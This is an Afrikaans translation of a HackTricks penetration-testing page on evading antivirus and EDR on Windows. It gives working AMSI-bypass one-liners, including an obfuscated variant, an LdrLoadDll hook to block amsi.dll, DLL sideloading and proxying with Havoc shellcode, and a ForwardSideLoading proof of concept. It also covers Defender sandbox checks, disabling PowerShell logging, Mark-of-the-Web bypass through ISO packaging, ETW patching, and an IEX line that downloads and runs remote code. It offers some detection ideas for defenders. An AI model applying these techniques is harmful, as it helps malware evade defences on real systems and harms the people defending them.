# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender se werking te staak.
- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender se werking te staak deur voor te gee ’n ander AV te wees.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Metodologie**

Tans gebruik AVs verskillende metodes om te kyk of ’n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of byte-reekse in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, checksum, ens.). Dit beteken dat die gebruik van bekende openbare tools jou makliker kan laat betrap, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie tipe detectie te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV geen manier hê om jou program te herken nie, maar jy sal ’n soort loader nodig hê om te dekripteer en die program in geheue te laat loop.

- **Obfuscation**

Soms hoef jy net sommige strings in jou binary of script te verander om dit verby AV te kry, maar dit kan tydrowend wees afhangende waarvan jy probeer obfuscate.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit neem baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om te toets teen Windows Defender se static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer in verskeie segmente en laat Defender elkeen afsonderlik skandeer; so kan dit jou presies vertel watter strings of bytes in jou binary gemerk is.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion gaan kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump op LSASS uit te voer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te omseil.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dynamic analysis te omseil. AVs het baie weinig tyd om lêers te skandeer sodat dit nie die gebruiker se werkvloei onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van implementering.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min hulpbronne (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelheid te kontroleer — nie alles word in die sandbox geïmplementeer nie.
- **Machine-specific checks** As jy ’n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program net afsluit.

Dit blyk dat Microsoft Defender se Sandbox rekenaarnam HAL9TH is; jy kan dus vir die rekenaarnam in jou malware kyk voordat dit detoneer—as die naam HAL9TH is, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die stryd teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos reeds genoem in hierdie pos, sal **public tools** uiteindelik **get detected** word, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Met mimikatz as voorbeeld is dit waarskynlik een van, indien nie die mees gemerkte stuk malware deur AVs en EDRs nie; alhoewel die projek baie cool is, is dit ook ’n nagmerrie om daarmee te werk om om AVs te kom, so soek net alternatiewe vir die doel wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads wysig vir omseiling, maak seker dat jy **automatic sample submission afskakel** in defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die lang termyn omseiling te bereik. As jy wil kyk of jou payload deur ’n bepaalde AV opgespoor word, installeer dit op ’n VM, probeer die automatic sample submission afskakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, beveel ek altyd aan om **prioritise using DLLs for evasion**; na my ervaring word DLL-lêers gewoonlik **veel minder gedetect** en ontleed, so dit is ’n baie eenvoudige truuk om te gebruik om in sekere gevalle detectie te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 op antiscan.me, terwyl die EXE payload ’n detection rate van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van ’n normale Havoc EXE payload teenoor ’n normale Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om veel meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak voordeel van die DLL-soekorde wat deur die loader gebruik word deur beide die slagoffer-toepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan programme wat vatbaar is vir DLL Sideloading nagaan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys uitset van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL files wat hulle probeer laai.

Ek beveel sterk aan dat jy **verken DLL Hijackable/Sideloadable programmes self**, hierdie tegniek is redelik stealthy as dit behoorlik uitgevoer word, maar as jy publiek-bekende DLL Sideloadable programmes gebruik, kan jy maklik gevang word.

Net deur 'n slegwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie outomaties jou payload laai nie, omdat die program bepaalde funksies binne daardie DLL verwag; om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** forwards the calls a program makes from the proxy (en slegwillige) DLL to the original DLL, waardeur die program se funksionaliteit behou bly en dit moontlik is om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project van [@flangvik](https://twitter.com/Flangvik/) gebruik

Hierdie is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL source code template en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Albei ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26-detectietempo op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **sterk aanbeveel** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons hier in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die exportinskrywing 'n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer 'n aanroeper die export oplos, sal die Windows loader:

- Laai `TargetDll` indien dit nog nie gelaai is nie
- Los `TargetFunc` daaruit op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit uit die beskermde KnownDLLs-naamruimte verskaf (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n ondertekende DLL wat 'n funksie exporteer wat doorgestuur is na 'n nie-KnownDLL modulenaam, en plaas daardie ondertekende DLL in dieselfde gids as 'n deur die aanvaller beheer­de DLL wat presies dieselfde naam het as die forwarded teeldoelmodule. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, en voer jou DllMain uit.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos via die normale soekorde.

PoC (kopieer-plak):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om code execution te kry; jy hoef nie die forwarded function te implementeer om DllMain te trigger nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die forward met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die laaier die forward na `NCRYPTPROV.SetAuditingInterface`
- Die laaier laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout ná `DllMain` reeds uitgevoer is

Jagwenke:
- Fokus op forwarded exports waar die target module nie 'n KnownDLL is nie. KnownDLLs is gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports oplys met hulpmiddels soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv., rundll32.exe) wat gesigneerde DLLs van nie-stelselpaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam uit daardie gids
- Waarsku op proses/module-kettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` wat onder gebruikers-skryfbare paaie voorkom
- Handhaaf code-integriteitsbeleid (WDAC/AppLocker) en weier write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net 'n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word, so moenie net op een hulpmiddel staatmaak nie — indien moontlik, probeer om verskeie evasion techniques aanmekaar te koppel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. In die begin was AVs net in staat om **lêers op skyf** te skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks daaraan doen nie omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om skripgedrag te inspekteer deur skripinhoude bloot te stel in 'n vorm wat sowel onversleuteld as onversluierd is.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` vooraf voeg en dan die pad na die uitvoerbare vanuit waarvan die skrip geloop het — in hierdie geval, powershell.exe.

Ons het geen lêer op die skyf neergelê nie, maar is steeds in-memory vasgevang weens AMSI.

Verder, vanaf **.NET 4.8**, word C#-kode ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wat in-memory uitvoering laad. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-memory uitvoering as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detecties werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om detection te ontduik.

AMSI het egter die vermoë van unobfuscating scripts selfs al het dit verskeie lae, so obfuscation kan 'n slegte opsie wees, afhangend van hoe dit gedoen is. Dit maak dit nie so eenvoudig om te ontduik nie. Soms is dit egter genoeg om 'n paar veranderlike name te verander en jy sal in orde wees; dit hang dus af van hoeveel iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit moontlik om dit maklik te manipuleer selfs wanneer jy as 'n nie-bevoorregte gebruiker loop. As gevolg van hierdie fout in die AMSI-implementering het navorsers verskeie maniere gevind om AMSI-scanning te ontduik.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) sal daartoe lei dat geen skandering vir die huidige proses geïnisieer word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) aan die lig gebring en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell code gevat om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, so 'n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is 'n gewysigde AMSI bypass wat ek geneem het van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en behels die vind van die adres van die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-gelewerde invoer) en dit oorskryf met instruksies om die kode vir E_INVALIDARG terug te gee; op hierdie manier sal die resultaat van die werklike skandering 0 teruggee, wat geïnterpreteer word as 'n skoon resultaat.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te bypass; kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is eers geïnitialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, language‑agnostic bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die gevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit en vind daar geen skanderings plaas vir daardie proses nie.

Implementeringsoorsig (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Werk oor PowerShell, WScript/CScript en pasgemaakte loaders (alles wat anders AMSI sou laai).
- Koppel dit met die voer van skripte via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is waargeneem in loaders wat uitgevoer word deur LOLBins (bv., `regsvr32` wat `DllRegisterServer` aanroep).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Verwyder die gedetekte handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekte AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te deursoek vir die AMSI-handtekening en dit dan met NOP-instruksies oor te skryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie geladen word nie, sodat jy jou skripte kan uitvoer sonder om deur AMSI geskandeer te word. Jy kan dit doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is ’n funksie wat jou toelaat om alle PowerShell-opdragte wat op ’n stelsel uitgevoer word te log. Dit kan handig wees vir ouditering en foutopsporing, maar dit kan ook ’n **probleem wees vir aanvallers wat detectie wil ontduik**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou skripte uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om ’n powershell te spawn sonder verdediging (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuskering

> [!TIP]
> Verskeie obfuskeringstegnieke berus op die enkriptering van data, wat die entropie van die binary sal verhoog en dit makliker maak vir AVs en EDRs om dit te detect. Wees versigtig hiermee en oorweeg om enkripsie slegs toe te pas op spesifieke dele van jou kode wat sensitief is of verborge moet bly.

### Deobfuskering van ConfuserEx-beskermde .NET-binaries

Wanneer jy malware analiseer wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te tref wat dekompilers en sandbokse sal blokkeer. Die onderstaande werkvloeie herstel betroubaar ’n byna–originele IL wat daarna in C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering verwydering – ConfuserEx enkripteer elke *method body* en dekodeer dit binne die *module* statiese konstruktor (`<Module>.cctor`). Dit patch ook die PE-checksum sodat enige verandering die binary kan laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en ’n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitset bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool / control-flow herstel – voer die *clean* lêer deur aan **de4dot-cex** (’n ConfuserEx-bewuste fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2-profiel  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante strings ontsleutel.

3.  Proxy-call verwydering – ConfuserEx vervang direkte method calls met liggewig-wrappers (a.k.a *proxy calls*) om dekompilasie verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API’s soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van onsigbare wrapper-funksies (`Class8.smethod_10`, …).

4.  Handmatige skoonmaak – voer die resulterende binary in dnSpy uit, soek na groot Base64-blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *werklike* payload te lokaliseer. Dikwels stoor die malware dit as ’n TLV-geënkodeerde byte-array wat binne `<Module>.byte_0` geïnitialiseer is.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** om die kwaadwillige monster te hoef te laat loop – nuttig wanneer jy op ’n aflyn-werkstasie werk.

> 🛈  ConfuserEx produseer ’n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as IOC gebruik kan word om monsters outomaties te triage.

#### Eenreël
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) compilation suite te verskaf wat verhoogde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` language te gebruik om, at compile time, obfuscated code te genereer sonder om enige eksterne tool te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag obfuscated operations by wat deur die C++ template metaprogramming framework gegenereer word, wat die lewe van die persoon wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende pe lêers kan obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fijnkorrelige code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op die assembly code-vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike konsep van normale control flow keer.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat executables wat met 'n **trusted** signing certificate onderteken is **nie SmartScreen sal aktiveer nie**.

'n Baie effektiewe manier om te voorkom dat jou payloads die Mark of The Web kry is om dit in 'n soort houer soos 'n ISO te pak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** toegepas kan word op **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n tool wat payloads in uitsethouers verpak om Mark-of-the-Web te omseil.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo vir die omseiling van SmartScreen deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige log-meganisme in Windows wat toepassings en stelselkomponente toelaat om **log events**. Dit kan egter ook deur security products gebruik word om malicious activities te monitor en detect.

Soos AMSI gedeaktiveer (bypassed) kan word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space process onmiddellik te laat terugkeer sonder om enige events te log. Dit word bereik deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting kry by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in memory te laai is al lank bekend en is steeds 'n baie goeie manier om jou post-exploitation tools uit te voer sonder om deur AV opgemerk te word.

Aangesien die payload direk in memory gelaai word sonder die disk te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in memory uit te voer, maar daar is verskillende maniere om dit te doen:

